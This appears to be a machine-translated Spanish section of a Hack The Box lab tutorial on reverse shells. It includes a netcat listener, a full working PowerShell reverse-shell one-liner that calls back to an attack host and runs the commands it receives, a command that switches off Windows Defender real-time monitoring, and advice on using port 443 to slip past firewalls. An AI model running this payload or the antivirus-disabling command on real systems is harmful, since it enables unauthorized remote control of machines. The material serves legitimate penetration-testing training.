# Conchas de reverso

Con un`reverse shell`, El cuadro de ataque tendrá un oyente en ejecución, y el objetivo necesitará iniciar la conexión.

### **Ejemplo de shell inverso**

![](https://academy.hackthebox.com/storage/modules/115/reverseshell.png)

A menudo usaremos este tipo de caparazón a medida que nos encontramos con sistemas vulnerables porque es probable que un administrador pase por alto las conexiones salientes, dándonos una mejor oportunidad de no ser detectados. La última sección discutió cómo los shells de enlace dependen de las conexiones entrantes permitidas a través del firewall en el lado del servidor. Será mucho más difícil lograr esto en un escenario del mundo real. Como se ve en la imagen de arriba, estamos comenzando un oyente para un shell inverso en nuestro cuadro de ataque y usando algún método (ejemplo:`Unrestricted File Upload`, `Command Injection`, etc.) para obligar al objetivo a iniciar una conexión con nuestro cuadro de destino, lo que significa efectivamente que nuestro cuadro de ataque se convierte en el servidor y el objetivo se convierte en el cliente.

No siempre necesitamos reinventar la rueda cuando se trata de cargas útiles (comandos y código) que tenemos la intención de usar cuando intentamos establecer un shell inverso con un objetivo. Existen herramientas útiles que los veteranos de Infosec han reunido para ayudarnos.[Hoja de trucos de shell inverso](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)es un recurso fantástico que contiene una lista de diferentes comandos, código e incluso generadores automatizados de shell inverso que podemos usar al practicar o en una participación real. Debemos tener en cuenta que muchos administradores conocen repositorios públicos y recursos de código abierto que los probadores de penetración comúnmente usan. Pueden hacer referencia a estos Repos como parte de sus consideraciones principales sobre qué esperar de un ataque y sintonizar sus controles de seguridad en consecuencia. En algunos casos, es posible que necesitemos personalizar un poco nuestros ataques.

Trabajemos a mano con esto para comprender mejor estos conceptos.

---

# **Práctico con un shell inverso simple en Windows**

Con este tutorial, estableceremos un shell inverso simple utilizando algún código PowerShell en un objetivo de Windows. Comencemos el objetivo y comencemos.

Podemos iniciar un oyente de NetCat en nuestro cuadro de ataque a medida que el objetivo genera.

### **Servidor (`attack box`)**

Conchas de reverso

```
xnoxos@htb[/htb]$ sudo nc -lvnp 443Listening on 0.0.0.0 443

```

Esta vez con nuestro oyente, lo estamos vinculando a un[puerto común](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/4/html/security_guide/ch-ports#ch-ports) (`443`), este puerto generalmente es para`HTTPS`conexiones. Es posible que deseemos usar puertos comunes como este porque cuando iniciamos la conexión con nuestro oyente, queremos asegurarnos de que no se bloquee saliendo a través del firewall del sistema operativo y a nivel de red. Sería raro ver a cualquier equipo de seguridad que bloquee 443 salidas, ya que muchas aplicaciones y organizaciones dependen de HTTPS para llegar a varios sitios web durante todo el día de trabajo. Dicho esto, un firewall capaz de una inspección profunda de paquetes y la visibilidad de la capa 7 puede ser capaz de detectar y detener una capa inversa saliendo en un puerto común porque está examinando el contenido de los paquetes de red, no solo la dirección IP y el puerto. La evasión detallada del firewall está fuera del alcance de este módulo, por lo que solo tocaremos brevemente las técnicas de detección y evasión en todo el módulo, así como en la sección dedicada al final.

Una vez que el objetivo de Windows ha generado, conectemos usando RDP.

NetCat se puede usar para iniciar el shell inverso en el lado de Windows, pero debemos tener en cuenta qué aplicaciones ya están presentes en el sistema. NetCat no es nativo de los sistemas de Windows, por lo que puede no ser confiable en contarlo como nuestra herramienta en el lado de Windows. Veremos en una sección posterior que para usar NetCat en Windows, debemos transferir un binario NetCat a un objetivo, lo que puede ser complicado cuando no tenemos capacidades de carga de archivos desde el inicio. Dicho esto, es ideal usar las herramientas nativas (que viven fuera de la tierra) al objetivo al que estamos tratando de obtener acceso.

`What applications and shell languages are hosted on the target?`

Esta es una excelente pregunta para hacer en cualquier momento que estemos tratando de establecer una carcasa inversa. Usemos el símbolo del sistema y PowerShell para establecer este shell inverso simple. Podemos usar un enlace de Shell inverso de PowerShell estándar para ilustrar este punto.

En el objetivo de Windows, abra un símbolo del sistema y copie y pegue este comando:

### **Cliente (Target)**

Conchas de reverso

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

```

Nota: Si estamos utilizando Pwnbox, tenga en cuenta que algunos navegadores no funcionan tan perfectamente al usar la función de portapapeles para pegar un comando directamente en la CLI de un objetivo. En estos casos, es posible que deseemos pegar en el bloc de notas en el objetivo, luego copiar y pegar desde el interior del objetivo.

Eche un vistazo de cerca al comando y considere lo que necesitamos cambiar para que esto nos permita establecer un caparazón inversa con nuestro cuadro de ataque. Este código de PowerShell también se puede llamar`shell code`o nuestro`payload`. Entregar esta carga útil al sistema de Windows fue bastante sencilla, considerando que tenemos un control completo del objetivo para fines de demostración. A medida que avanza este módulo, notaremos la dificultad aumenta en cómo entregamos la carga útil a los objetivos.

`What happened when we hit enter in command prompt?`

### **Cliente (Target)**

Conchas de reverso

```
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent

```

El`Windows Defender antivirus` (`AV`) El software detuvo la ejecución del código. Esto funciona exactamente como se pretendía, y desde un`defensive`perspectiva, esta es un`win`. Desde un punto de vista ofensivo, hay algunos obstáculos que superar si AV está habilitado en un sistema con el que estamos tratando de conectarnos. Para nuestros propósitos, querremos deshabilitar el antivirus a través del`Virus & threat protection settings`o utilizando este comando en una consola administrativa de PowerShell (haga clic derecho, ejecute como administrador):

### **Deshabilitar AV**

Conchas de reverso

```powershell
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

Una vez que AV está deshabilitado, intente ejecutar el código nuevamente.

### **Servidor (cuadro de ataque)**

Conchas de reverso

```
xnoxos@htb[/htb]$ sudo nc -lvnp 443Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student

```

De vuelta en nuestro cuadro de ataque, debemos notar que establecimos con éxito un caparazón inverso. Podemos ver esto por el cambio en el mensaje que comienza con`PS`y nuestra capacidad de interactuar con el sistema operativo y el sistema de archivos. Intente ejecutar algunos comandos estándar de Windows para practicar un poco.

Ahora, probemos nuestro conocimiento con algunas preguntas de desafío.